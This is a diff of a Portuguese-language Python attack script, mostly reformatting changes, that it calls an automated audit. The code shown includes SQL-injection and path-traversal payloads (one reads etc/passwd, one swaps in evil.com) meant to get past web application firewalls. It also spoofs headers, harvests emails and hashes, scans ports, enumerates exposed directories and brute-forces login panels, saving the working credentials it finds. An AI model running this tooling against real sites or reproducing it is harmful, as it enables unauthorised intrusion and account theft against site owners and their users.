@@ -7,9 +7,9 @@ import sys
 import time
 from urllib.parse import urlparse
 
-import dns.resolver
 from bs4 import BeautifulSoup
 from colorama import Fore, Style, init
+import dns.resolver
 from gevent import socket as gsocket
 from gevent.pool import Pool
 import requests
@@ -26,7 +26,10 @@ PROXIES = [
 ]
 
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101"
+        " Firefox/128.0"
+    ),
     "Googlebot/2.1 (http://www.google.com/bot.html)",
     "curl/8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0",
     "Python-urllib/3.12",
@@ -97,10 +100,13 @@ def waf_bypass_payloads(base_url):
     payloads = [
         f"{base_url}' OR 1=1-- -",
         f'{base_url}" OR "x"="x',
-        f"{base_url}?id=1%27%20UNION%20SELECT%20null,concat(user,0x3a,pass)from%20users--",
+        (
+            f"{base_url}?id=1%27%20UNION%20SELECT%20null,"
+            "concat(user,0x3a,pass)from%20users--"
+        ),
         f"{base_url}?param=%2527%2520OR%25201%253D1",
         f"{base_url}#{'A'*9999}",
-        f"{base_url}/{ '../' * 5 }etc/passwd%00.jpg",
+        f"{base_url}/{'../' * 5}etc/passwd%00.jpg",
         f"{base_url}?id=1&id='&debug=1&test='",
         f"{base_url.replace(u.netloc, 'evil.com')}",
         f"{base_url}?{''.join(random.choices('abcdef', k=2000))}",
@@ -111,14 +117,15 @@ def waf_bypass_payloads(base_url):
 
 def hyper_osint(target):
     print(
-        f"{Fore.RED}💀 [HYPER-OSINT] TORCHING {target} WITH EXTREME PREJUDICE{Style.RESET_ALL}"
+        f"{Fore.RED}💀 [HYPER-OSINT] TORCHING {target} WITH EXTREME"
+        f" PREJUDICE{Style.RESET_ALL}"
     )
 
     headers = {
         "User-Agent": random.choice(USER_AGENTS),
         "Accept": "*/*",
         "Connection": "close",
-        "X-Forwarded-For": f"192.168.0.{random.randint(1,254)}",
+        "X-Forwarded-For": f"192.168.0.{random.randint(1, 254)}",
         "Referer": "https://google.com/search?q=youvebeenhacked",
     }
 
@@ -154,16 +161,14 @@ def hyper_osint(target):
             re.IGNORECASE,
         )
         hashes = re.findall(
-            r"\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b", r.text
+            r"\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b",
+            r.text,
         )
         hashes = [h for h in hashes if len(set(h)) > 4]
 
         soup = BeautifulSoup(r.text, "lxml")
         title = soup.find("title")
         meta_desc = soup.find("meta", attrs={"name": "description"})
-        scripts = [s.get("src") for s in soup.find_all("script") if s.get("src")]
-        forms = [(f.get("action"), f.get("method")) for f in soup.find_all("form")]
-        comments = re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)
 
         domain = urlparse(target).netloc
         subdomains = [
@@ -203,22 +208,24 @@ def hyper_osint(target):
 
         if hashes:
             with open(
-                os.path.join(script_dir, "hashes_found.txt"), "w", encoding="utf-8"
+                os.path.join(script_dir, "hashes_found.txt"),
+                "w",
+                encoding="utf-8",
             ) as f:
                 for h in hashes:
                     f.write(h + "\n")
 
         AUDIT_REPORT["osint"] = {
             "title": title.get_text() if title else "None",
-            "meta_description": meta_desc.get("content")
-            if meta_desc
-            else "None",
+            "meta_description": (
+                meta_desc.get("content") if meta_desc else "None"
+            ),
             "emails": list(set(emails)),
             "phones": phones_flat,
             "chApi": chApi_flat,
             "hashes": hashes,
             "subdomains": live_subs,
-            "comments_count": len(comments),
+            "comments_count": len(re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)),
             "server": r.headers.get("Server", "Unknown"),
             "x_powered_by": r.headers.get("X-Powered-By", "None"),
         }
@@ -240,7 +247,8 @@ def syn_scan_worker(host, port, results, timeout=0.5):
             except OSError:
                 service = "unknown"
             print(
-                f"{Fore.GREEN}🔓 OPEN PORT: {port}/tcp → {service.upper()}{Style.RESET_ALL}"
+                f"{Fore.GREEN}🔓 OPEN PORT: {port}/tcp →"
+                f" {service.upper()}{Style.RESET_ALL}"
             )
             results.append({"port": port, "service": service})
         sock.close()
@@ -250,7 +258,8 @@ def syn_scan_worker(host, port, results, timeout=0.5):
 
 def port_scan(host, max_port=1000, threads=500):
     print(
-        f"{Fore.RED}💣 [PORT SCAN] ON {host} — {max_port} PORTS — {threads} THREADS{Style.RESET_ALL}"
+        f"{Fore.RED}💣 [PORT SCAN] ON {host} — {max_port} PORTS —"
+        f" {threads} THREADS{Style.RESET_ALL}"
     )
     try:
         target_ip = socket.gethostbyname(host)
@@ -391,7 +400,6 @@ def bruteforce_com_usuarios(target_url, usuarios_encontrados):
                         allow_redirects=True,
                     )
 
-                    # Validação rigorosa contra falsos positivos
                     sucesso = (
                         any(
                             kw in r2.url
@@ -417,7 +425,8 @@ def bruteforce_com_usuarios(target_url, usuarios_encontrados):
                             encoding="utf-8",
                         ) as f:
                             f.write(
-                                f"VALIDADO - Painel: {painel_url} | User: {usuario} | Pass: {senha}\n"
+                                f"VALIDADO - Painel: {painel_url} | User:"
+                                f" {usuario} | Pass: {senha}\n"
                             )
                     time.sleep(0.2)
                 except requests.RequestException:
@@ -425,7 +434,9 @@ def bruteforce_com_usuarios(target_url, usuarios_encontrados):
 
 
 def enumerar_vulnerabilidades(target_url):
-    print(f"{Fore.MAGENTA}🔎 INICIANDO ENUMERAÇÃO ASSÍNCRONA...{Style.RESET_ALL}")
+    print(
+        f"{Fore.MAGENTA}🔎 INICIANDO ENUMERAÇÃO ASSÍNCRONA...{Style.RESET_ALL}"
+    )
     base = target_url.rstrip("/")
     headers = {"User-Agent": random.choice(USER_AGENTS)}
 
@@ -457,9 +468,7 @@ def enumerar_vulnerabilidades(target_url):
     except requests.RequestException:
         pass
 
-    # Execução assíncrona das requisições de diretórios usando gevent Pool
     pool = Pool(20)
-    achados = []
 
     def check_path(path, descricao):
         try:
@@ -474,7 +483,6 @@ def enumerar_vulnerabilidades(target_url):
             )
             if r.status_code == 200 and len(r.text) > 50:
                 print(f"{Fore.RED}🔴 {descricao} → {url}{Style.RESET_ALL}")
-                achados.append({"url": url, "descricao": descricao})
                 AUDIT_REPORT["vulnerabilities"].append(
                     {"url": url, "description": descricao}
                 )
@@ -490,13 +498,21 @@ def gerar_relatorios(target_url):
     script_dir = os.path.dirname(os.path.abspath(__file__))
     AUDIT_REPORT["target"] = target_url
 
-    # Salva JSON
     json_path = os.path.join(script_dir, "relatorio_auditoria.json")
     with open(json_path, "w", encoding="utf-8") as f:
         json.dump(AUDIT_REPORT, f, indent=4, ensure_ascii=False)
 
-    # Salva HTML Interativo
     html_path = os.path.join(script_dir, "relatorio_auditoria.html")
+    vuln_list = "".join(
+        [
+            f"<li><b>{v['description']}</b>: <a href='{v['url']}'"
+            f" target='_blank'>{v['url']}</a></li>"
+            for v in AUDIT_REPORT["vulnerabilities"]
+        ]
+    )
+    if not vuln_list:
+        vuln_list = "<li>Nenhuma vulnerabilidade crítica direta listada.</li>"
+
     html_content = f"""<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -519,7 +535,7 @@ def gerar_relatorios(target_url):
     <div class="card">
         <h2>Vulnerabilidades Críticas / Diretórios Expostos</h2>
         <ul>
-            {"".join([f"<li><b>{v['description']}</b>: <a href='{v['url']}' target='_blank'>{v['url']}</a></li>" for v in AUDIT_REPORT['vulnerabilities']]) if AUDIT_REPORT['vulnerabilities'] else "<li>Nenhuma vulnerabilidade crítica direta listada.</li>"}
+            {vuln_list}
         </ul>
     </div>
     <div class="card">
@@ -533,7 +549,9 @@ def gerar_relatorios(target_url):
         f.write(html_content)
 
     print(
-        f"{Fore.GREEN}📊 Relatórios consolidados gerados com sucesso: relatorio_auditoria.json e relatorio_auditoria.html{Style.RESET_ALL}"
+        f"{Fore.GREEN}📊 Relatórios consolidados gerados com sucesso:"
+        " relatorio_auditoria.json e"
+        f" relatorio_auditoria.html{Style.RESET_ALL}"
     )
 
 
@@ -542,22 +560,20 @@ def launch_nuclear_osint(target_url):
         target_url = "http://" + target_url
 
     print(
-        f"{Fore.MAGENTA}🚀 Iniciando Framework Automatizado Avançado: {target_url}{Style.RESET_ALL}"
+        f"{Fore.MAGENTA}🚀 Iniciando Framework Automatizado Avançado:"
+        f" {target_url}{Style.RESET_ALL}"
     )
     parsed = urlparse(target_url)
     host = parsed.netloc
 
     headers = {"User-Agent": random.choice(USER_AGENTS)}
 
-    # Etapa 0: Detecção de WAF
     detect_waf(target_url, headers)
-
-    # Etapa 1: OSINT
     hyper_osint(target_url)
 
-    # Etapa 2: WAF Bypass
     print(
-        f"{Fore.RED}🧨 TESTANDO PAYLOADS DE WAF BYPASS COM CONCORRÊNCIA...{Style.RESET_ALL}"
+        f"{Fore.RED}🧨 TESTANDO PAYLOADS DE WAF BYPASS COM"
+        f" CONCORRÊNCIA...{Style.RESET_ALL}"
     )
     pool = Pool(10)
 
@@ -572,7 +588,8 @@ def launch_nuclear_osint(target_url):
             )
             if r.status_code == 200:
                 print(
-                    f"{Fore.GREEN}✅ PASSOU ({len(r.text)} bytes): {payload[:60]}...{Style.RESET_ALL}"
+                    f"{Fore.GREEN}✅ PASSOU ({len(r.text)} bytes):"
+                    f" {payload[:60]}...{Style.RESET_ALL}"
                 )
                 AUDIT_REPORT["waf_bypass_results"].append(
                     {"payload": payload, "status": 200}
@@ -584,13 +601,8 @@ def launch_nuclear_osint(target_url):
         pool.spawn(test_bypass, payload)
     pool.join()
 
-    # Etapa 3: Port Scan
     port_scan(host, max_port=1000)
-
-    # Etapa 4: Enumeração e Brute Force
     enumerar_vulnerabilidades(target_url)
-
-    # Etapa 5: Geração de Relatórios Finais (JSON / HTML)
     gerar_relatorios(target_url)
     print(f"{Fore.YELLOW}🎉 AUDITORIA CONCLUÍDA COM SUCESSO!{Style.RESET_ALL}")
 
